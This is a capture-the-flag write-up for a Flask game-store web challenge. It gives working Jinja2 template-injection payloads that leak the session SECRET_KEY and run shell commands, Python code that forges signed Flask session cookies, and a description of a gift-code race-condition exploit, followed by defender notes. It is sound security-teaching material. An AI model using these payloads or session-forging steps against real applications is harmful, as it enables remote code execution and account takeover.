<!-- writeup by Abdelkader -->
<!-- standalone repo: https://github.com/Abdelkad3r/hasblctf-2026/tree/main/web/dteam -->
<!-- (full solve.py lives there) -->

# DTeam (web)

| Field    | Value                                                          |
| -------- | -------------------------------------------------------------- |
| Category | web                                                            |
| URL      | `http://34.77.68.154:10203/` (now offline)                     |
| Server   | Flask app, `Werkzeug/3.1.8 Python/3.9.25`, runs as **root**    |
| Flag     | `HASBL{7his_W3bsi73_L00ks_S0_F4mili4r}`                        |

## Description

> Have you seen the new website called DTeam for buying games?

A Steam-styled game store (CSS variables `--steam-blue`, `--steam-dark`,
`--steam-light`, `--steam-green` — the dev didn't even rename them).
You can register, log in, redeem gift codes, fill a cart, check out, and
download a PDF receipt for each order.

The intended chain is **SSTI in the PDF receipt template**, where the
username is rendered through Jinja2 without escaping. The username has
a 30-character cap that's tight enough to block most direct RCE chains
— but `{{config['SECRET_KEY']}}` fits in 24 chars, leaking the Flask
session signing key. With SECRET_KEY in hand you forge a session whose
`last_order[*].name` field is an *uncapped* Jinja2 sink, and the second
SSTI runs full RCE as root.

## TL;DR

```
1. register "{{config['SECRET_KEY']}}" / any password
2. add anything to cart, /checkout
3. GET /download_invoice              -> PDF prints SECRET_KEY bytes
4. flask-unsign-style forge:
     {"user_id": <ours>,
      "last_order": [{"name":"{{lipsum.__globals__.os.popen('cat /flag.txt').read()}}",
                      "price":99.99}]}
5. set the cookie, GET /download_invoice  -> PDF prints the flag
   HASBL{7his_W3bsi73_L00ks_S0_F4mili4r}
```

## Recon

### Step 1 — endpoint surface

```
/                       Steam-clone store front
/register, /login       account creation + auth
/cart, /codes           gift-code redeem (DTEAM-XXXX format)
/checkout               places order, drops last_order into session
/messages               support-ticket page (also Jinja2-rendered)
/download_invoice       per-order PDF receipt
```

### Step 2 — gift-code race (red herring)

`POST /codes` redeems a gift code into the wallet. The redeem path
isn't atomic — pre-built ~500 sockets and fired in <100 ms, redeeming
the same `DTEAM-XXXX` code 34× → $20 code → $680 wallet. That's a
classic store race-condition, useful for buying GTA7, but **not the
flag path** — the flag is not behind a paid item.

### Step 3 — PDF receipt is Jinja2

Register with the username `aaaaa{{7*7}}` (10 chars, fits the 30-char
cap). Place any order, hit `/download_invoice`. The receipt's
"Customer Account:" field renders as `aaaaa49`. So the username string
is *evaluated* as a Jinja2 template, not just printed. Classic SSTI
sink.

### Step 4 — SECRET_KEY in 24 chars

The 30-char username cap blocks most fool-proof RCE chains
(`{{ ''.__class__.__mro__[2].__subclasses__()…}}` is far too long), but

```
{{config['SECRET_KEY']}}
```

is **24 characters** — fits comfortably. Register that as your
username, place an order, download the receipt — the PDF's "Customer
Account:" line prints the raw bytes of the Flask session key:

```
b'\xd2\x0e\x80_\xf8\x88\xfc\x8e\x0fH\xd8\x16\x9b\x15F\x8e\xf6q\xd1yl\xb6uV'
```

24 random bytes. With those, every Flask session is forgeable.

### Step 5 — `last_order` is the uncapped sink

Probing the receipt template for additional render hooks, sending the
username `{{config.r.environ}}` (which evaluates `request.environ`)
leaked the HTTP cookie of a *concurrent* user's session — including a
decoded `last_order` field shaped like:

```json
{"last_order":[{"name":"League of Noobs","price":0.0}], "user_id":10943}
```

So the PDF template iterates `session.last_order` and renders each
item's `name` *through Jinja2 with no length cap and no `|escape`*.
That's the keyhole: stuff a long SSTI payload into `name`, sign the
session, GET `/download_invoice`.

### Step 6 — forge and exfiltrate

`itsdangerous` Flask-style session signing with the leaked SECRET_KEY:

```python
from itsdangerous import URLSafeTimedSerializer
from flask.sessions import TaggedJSONSerializer

s = URLSafeTimedSerializer(
    SECRET_KEY,
    salt="cookie-session",
    serializer=TaggedJSONSerializer(),
    signer_kwargs={"key_derivation": "hmac", "digest_method": "sha1"},
)

payload = {
    "user_id": OUR_UID,
    "last_order": [{
        "name": "{{lipsum.__globals__.os.popen('cat /flag.txt').read()}}",
        "price": 99.99,
    }],
}
cookie = s.dumps(payload)
```

`lipsum` is `jinja2.utils.generate_lorem_ipsum`, so
`lipsum.__globals__` is `jinja2.utils.__dict__`, which has imported
`os` at module load. Full unsandboxed `os.popen` — no need for
`__class__.__mro__` introspection.

`Cookie: session=<forged>` + `GET /download_invoice` → the PDF's
"Item Name:" column prints the contents of `/flag.txt`:

```
HASBL{7his_W3bsi73_L00ks_S0_F4mili4r}
```

The container runs as root; `/flag.txt` and `/app/flag.txt` both
exist, both readable.

## Flag

```
HASBL{7his_W3bsi73_L00ks_S0_F4mili4r}
```

*"This website looks so familiar"* — the Steam-clone CSS variables
were never renamed.

## Defender notes

* **Jinja2 + user input + no `|escape` = RCE.** The PDF receipt
  template renders `customer_username | safe` (effectively) and the
  same for `item.name`. Adding `|escape` (or auto-escape) to the
  template breaks the SSTI primitive instantly. Auto-escape is on by
  default for HTML templates in Flask, but PDF-renderers (WeasyPrint,
  ReportLab via jinja2) often bypass that — auditing every renderer
  for an explicit `autoescape=True` is the durable fix.
* **SECRET_KEY is plaintext-equivalent if leaked once.** Even
  rate-limited input length caps don't help: a 24-character template
  expression is enough to dump it. The defence is to (a) never render
  user input via Jinja2 (treat it as data, not template), and (b)
  rotate SECRET_KEY on any incident; *all* sessions must invalidate.
* **`lipsum.__globals__.os` is the shortest Jinja2-to-RCE bridge.**
  Filter alternatives like `cycler.__init__.__globals__.os` exist but
  are longer. The `lipsum` chain is 39 chars including `os.popen()`
  with a 1-char arg — pair-list of every short Jinja2 sandbox-escape
  for defenders to grep template caches against.
* **The race condition on `/codes` is a separate, deep bug.** Even
  ignoring SSTI, the unbounded gift-code redeem would let an attacker
  inflate wallets at will. SQL-level `SELECT … FOR UPDATE` (or
  optimistic locking with a version column) on the code row, combined
  with a unique `(code_id, user_id)` index on the redemption table,
  fixes it without rate limiting. Locking only the wallet row is
  insufficient — the dup occurs because the code row's "is_consumed"
  flag is checked *before* the wallet credit.
* **Receipt PDFs as exfil sinks.** Any feature that turns user input
  into a downloadable file (PDF, CSV, ICS, image-thumbnail) is a
  high-value SSTI/SSRF target because the renderer often runs at
  higher privilege than the user-request handler (e.g., separate
  WeasyPrint worker container, headless Chromium, LaTeX). On this
  challenge the renderer was in-process, but the same pattern in a
  microservice deployment routinely lets an attacker pivot from a
  low-priv web tier into a privileged renderer tier.

## Files

* [`solve.py`](https://github.com/Abdelkad3r/hasblctf-2026/blob/main/web/dteam/solve.py) — argparse-driven solver. Registers a user
  with the `{{config['SECRET_KEY']}}` username, places an order,
  downloads the PDF, extracts SECRET_KEY, forges the Flask session with
  a `last_order` SSTI payload, re-downloads the PDF, prints the flag.
  Standard library + `itsdangerous` + `pdfminer.six` (for PDF text
  extraction).

## Requirements

```
pip install itsdangerous pdfminer.six
```
